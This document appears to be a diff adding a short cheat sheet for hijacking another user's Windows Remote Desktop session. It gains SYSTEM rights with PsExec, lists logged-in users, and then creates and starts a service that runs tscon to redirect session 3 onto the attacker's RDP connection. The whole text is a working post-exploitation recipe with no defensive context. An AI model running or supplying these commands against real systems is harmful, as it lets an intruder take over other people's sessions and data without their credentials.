@@ -1,0 +1,13 @@
+Elevate permission to SYSTEM
+PsExec.exe -s \\localhost cmd
+
+whoami
+
+#Get Conneted user
+query user
+
+#Create service which will hijack user's session:
+sc create sesshijack binpath= "cmd.exe /k tscon 3 /dest:rdp-tcp#0"
+
+#start the service
+net start sesshijack
